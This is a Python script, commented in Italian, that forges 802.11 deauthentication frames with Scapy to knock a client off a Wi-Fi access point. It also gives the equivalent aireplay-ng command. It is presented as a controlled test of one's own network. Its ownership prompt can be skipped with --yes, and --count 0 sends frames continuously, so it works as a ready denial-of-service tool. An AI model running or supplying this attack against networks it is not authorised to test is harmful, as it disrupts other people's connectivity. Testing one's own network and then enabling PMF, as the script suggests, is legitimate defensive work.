#!/usr/bin/env python3
"""
deauth_test.py — Test di attacco deauthentication CONTROLLATO sulla TUA rete.

  ╔══════════════════════════════════════════════════════════════════════╗
  ║  USO AUTORIZZATO SOLTANTO.                                            ║
  ║  Esegui solo contro un access point e dispositivi che POSSIEDI o per ║
  ║  cui hai autorizzazione scritta. Inviare deauth verso reti altrui e' ║
  ║  un attacco DoS ILLEGALE. Lo scopo qui e' verificare la resistenza   ║
  ║  della tua rete e poi mitigare con WPA3/PMF (802.11w).               ║
  ╚══════════════════════════════════════════════════════════════════════╝

Come funziona: i frame di gestione 802.11 (deauth) non sono autenticati in
WPA2. Falsificandone la sorgente come l'AP, il client crede che l'AP voglia
disconnetterlo. Inviamo sia AP->client sia client->AP.

Equivalente con lo strumento standard (gia' sul tuo sistema):
    sudo aireplay-ng --deauth 64 -a <BSSID> -c <CLIENT> wlan0mon

Uso:
    sudo python3 deauth_test.py -i wlan0mon -b AA:BB:CC:DD:EE:FF \\
        -c 11:22:33:44:55:66 --channel 6 --count 64

Guardrail integrati:
  * count limitato di default (no flood infinito senza scelta esplicita)
  * conferma interattiva con dichiarazione di proprieta' della rete
  * logging chiaro di cosa viene inviato
"""
import argparse
import os
import re
import sys
import time

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
except ImportError:
    sys.exit("Scapy non trovato. Installa con:  pip install scapy")

MAC_RE = re.compile(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
BROADCAST = "ff:ff:ff:ff:ff:ff"


def valid_mac(mac):
    return bool(MAC_RE.match(mac))


def build_frames(bssid, client):
    """Crea i frame deauth nei due sensi (AP->client e client->AP)."""
    frames = []
    # AP -> client : "ti disconnetto" (reason 7 = Class 3 frame from nonassoc STA)
    frames.append(
        RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    )
    if client.lower() != BROADCAST:
        # client -> AP : "mi disconnetto" (rafforza l'effetto su client reali)
        frames.append(
            RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
        )
    return frames


def main():
    ap = argparse.ArgumentParser(
        description="Test deauth CONTROLLATO sulla propria rete (uso autorizzato).")
    ap.add_argument("-i", "--iface", required=True, help="interfaccia in monitor mode")
    ap.add_argument("-b", "--bssid", required=True, help="BSSID (MAC) del TUO access point")
    ap.add_argument("-c", "--client", default=BROADCAST,
                    help="MAC del TUO dispositivo bersaglio (default: broadcast)")
    ap.add_argument("--channel", type=int, help="canale dell'AP (consigliato impostarlo)")
    ap.add_argument("--count", type=int, default=64,
                    help="numero di round di frame da inviare (default: 64; 0 = continuo)")
    ap.add_argument("--interval", type=float, default=0.1,
                    help="secondi tra un round e l'altro (default: 0.1)")
    ap.add_argument("--yes", action="store_true",
                    help="salta la conferma interattiva (per script; usalo con consapevolezza)")
    args = ap.parse_args()

    if os.geteuid() != 0:
        sys.exit("Servono privilegi di root. Rilancia con sudo.")
    for label, mac in (("BSSID", args.bssid), ("client", args.client)):
        if not valid_mac(mac):
            sys.exit(f"{label} non valido: {mac}")

    # --- Guardrail: conferma esplicita di proprieta'/autorizzazione ---
    if not args.yes:
        print(__doc__.split("Come funziona")[0])
        print(f"Bersaglio:  AP={args.bssid}  client={args.client}  canale={args.channel}")
        ans = input("Dichiari di POSSEDERE o essere AUTORIZZATO su questa rete? [scrivi 'si']: ")
        if ans.strip().lower() not in ("si", "sì", "yes"):
            sys.exit("Annullato.")

    if args.channel:
        os.system(f"iw dev {args.iface} set channel {args.channel}")
        print(f"[*] Canale impostato a {args.channel}")

    frames = build_frames(args.bssid, args.client)
    print(f"[*] Invio deauth su {args.iface}: {args.bssid} <-> {args.client}")
    print(f"[*] Round: {'continuo (Ctrl+C per fermare)' if args.count == 0 else args.count}")

    sent = 0
    try:
        rounds = 0
        while args.count == 0 or rounds < args.count:
            # 'count=1' per frame; piu' frame per round se non e' broadcast
            for f in frames:
                sendp(f, iface=args.iface, count=1, verbose=False)
                sent += 1
            rounds += 1
            if rounds % 10 == 0 or rounds == args.count:
                print(f"[*] round {rounds} | frame inviati: {sent}")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Interrotto.")
    except OSError as e:
        sys.exit(f"Errore di invio su '{args.iface}': {e}\n"
                 "Monitor mode + injection attivi? Prova: sudo aireplay-ng --test " + args.iface)
    finally:
        print(f"[+] Totale frame inviati: {sent}")
        print("[+] Ora controlla il detector e il dispositivo bersaglio.")
        print("[+] Passo successivo: attiva WPA3/PMF sul router e ripeti — non dovrebbe piu' funzionare.")


if __name__ == "__main__":
    main()
